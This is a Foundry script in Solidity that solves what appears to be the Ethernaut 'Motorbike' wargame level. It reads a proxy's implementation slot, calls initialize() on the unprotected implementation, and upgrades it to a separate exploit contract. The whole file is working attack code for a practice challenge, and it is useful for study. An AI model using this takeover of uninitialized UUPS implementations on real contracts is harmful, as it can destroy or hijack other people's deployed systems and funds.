pragma solidity ^0.8.14;

import {Script, console} from "forge-std/Script.sol";
import {VmSafe} from "forge-std/Vm.sol";
import {MotorbikeExploit} from "../src/Level25Exploit.sol";

contract Level25Script is Script {
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function run() public {
        VmSafe.Wallet memory wallet = vm.createWallet(vm.envUint("PRIVATE_KEY"));

        address payable contractAddress = payable(vm.envAddress("CONTRACT"));

        vm.startBroadcast(wallet.privateKey);
        exploit(contractAddress);
        vm.stopBroadcast();

        // Since cancun upgrade, I think this level has no solution
        require(levelDone(contractAddress), "Solution failed");
    }

    function exploit(address _target) private {
        address implementation = address(uint160(uint256(vm.load(_target, _IMPLEMENTATION_SLOT))));
        Engine engine = Engine(implementation);
        engine.initialize();
        MotorbikeExploit e = new MotorbikeExploit();
        console.log("EXPLOIT ADDRESS", address(e));
        engine.upgradeToAndCall(address(e), abi.encodeWithSignature("exploit()"));
    }

    function levelDone(address _target) private returns (bool) {
        (bool ok,) = address(_target).call(abi.encodeWithSignature("horsePower()"));
        return !ok;
    }
}

interface Engine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}
